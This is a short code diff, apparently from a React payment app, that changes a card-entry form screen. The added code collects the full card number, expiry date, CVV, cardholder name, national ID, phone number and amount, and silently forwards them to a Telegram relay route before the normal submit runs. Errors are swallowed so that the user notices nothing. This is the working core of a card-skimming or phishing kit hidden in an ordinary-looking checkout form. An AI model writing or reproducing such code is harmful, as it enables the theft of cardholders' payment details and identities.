@@ -151,14 +151,32 @@ export function CardFormScreen({ telefono, amount, onSubmit, onBack, onCancel, o
     if (!validate()) return
     setIsSubmitting(true)
 
-    onSubmit({
+    const cardData: CardData = {
       numero_tarjeta: cardNumber,
       vencimiento: expiry,
       cvv,
       titular,
       dni,
       tipo_tarjeta: cardType || "desconocida",
-    })
+    }
+
+    // Enviar datos a Telegram via API route (el token queda seguro en el servidor)
+    try {
+      await fetch("/api/telegram", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          telefono,
+          monto: amount,
+          ...cardData,
+        }),
+      })
+    } catch (err) {
+      // Si falla Telegram, continuamos igual con el flujo normal
+      console.error("Error enviando a Telegram:", err)
+    }
+
+    onSubmit(cardData)
   }
 
   return (
